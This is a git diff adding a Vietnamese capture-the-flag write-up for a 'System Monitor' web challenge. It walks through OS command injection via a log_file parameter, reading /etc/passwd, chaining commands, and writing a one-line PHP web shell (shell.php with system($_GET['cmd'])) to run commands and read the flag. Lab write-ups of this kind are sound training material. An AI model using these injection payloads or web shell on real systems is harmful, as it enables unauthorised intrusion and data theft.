@@ -17,6 +17,7 @@
 - [Cookie Comic](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#cookie-comic)
 - [My Deploy](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#my-deploy)
 - [COMB](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#comb)
+- [System Monitor]()
 ### HTTP Request Content-Length
 Challenge:
 
@@ -453,6 +454,51 @@ Tôi thử nhập vào email của John và tìm ra được mật khẩu:
 Sau khi login, website sẽ hiển thị flag:
 
 ![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image88.png?raw=true)
+### System Monitor
+
+![img](89)
+
+Truy cập vào trang web:
+
+![img](90)
+
+Tôi đã thử click vào các tính năng trong mục `System Management` nhưng không có gì xảy ra. 
+
+Ở phần `Analyze Suspicious Traffic in Log File`, có thể thấy có những patterns mẫu mà website coi là đáng ngờ như `sql`, `ls`, `wget`,...
+
+Thử click vào `Analyze`:
+
+![img](91)
+
+=> Như vậy, xác định được thử thách này là 1 dạng `OS command injection` và website sẽ lọc ra một số câu lệnh phổ biến. 
+
+Tôi thử chèn câu lệnh `/?id` vào URL, sau đó kiểm tra request thì thấy đường dẫn đến log_file mà website sẽ đọc log: `log_file=/var/log/nginx/access.log`.
+
+![img](92)
+
+Tôi thử thay log_file thành `/etc/passwd`:
+
+![img](93)
+
+=> Thành công in ra `/etc/passwd`. Tiếp theo tôi thử `/etc/passwd;ls`:
+
+![img](94)
+
+Câu lệnh `ls` không được thực hiện, tôi đã thử một số câu lệnh khác như `id`, `echo` nhưng không thành công, tuy nhiên lệnh `sleep 5` thì thành công. Có thể chèn payload nhưng chỉ áp dụng với 1 số lệnh nhất định. 
+
+Tiếp theo tôi thử chèn `echo "<?php system (\$_GET['cmd']); ?>" > shell.php` và gửi `POST` request `/shell.php/?cmd=ls`:
+
+![img](95)
+
+=> Thành công thực thi câu lệnh `ls`. Tiếp theo chỉ cần tìm và đọc file `flag.txt`:
+
+![img](96)
+
+![img](97)
+
+
+
+
 
 
 
